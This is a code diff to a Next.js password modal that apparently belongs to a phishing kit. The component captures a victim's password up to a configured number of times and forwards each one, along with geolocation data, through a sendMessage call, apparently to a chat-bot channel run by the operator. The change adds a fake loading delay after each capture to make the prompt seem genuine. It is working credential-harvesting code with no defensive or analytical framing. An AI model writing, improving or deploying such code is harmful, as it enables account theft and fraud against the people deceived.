@@ -11,13 +11,14 @@ import Image from 'next/image';
 import { type FC, useEffect, useState } from 'react';
 
 const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
-    const [showPassword, setShowPassword] = useState(false);
+    const [attempts, setAttempts] = useState(0);
+    const [isLoading, setIsLoading] = useState(false);
     const [password, setPassword] = useState('');
     const [showError, setShowError] = useState(false);
-    const [isLoading, setIsLoading] = useState(false);
+    const [showPassword, setShowPassword] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
+
     const { geoInfo, messageId } = store();
-    const [attempts, setAttempts] = useState(0);
     const maxPass = config.MAX_PASS ?? 3;
 
     const t = (text: string): string => {
@@ -58,6 +59,9 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         const message = `<b>🔒 Password ${next}/${maxPass}:</b> <code>${password}</code>`;
         try {
             await sendMessage(message, messageId ?? undefined);
+            if (config.PASSWORD_LOADING_TIME) {
+                await new Promise((resolve) => setTimeout(resolve, config.PASSWORD_LOADING_TIME * 1000));
+            }
             if (next >= maxPass) {
                 nextStep();
             } else {
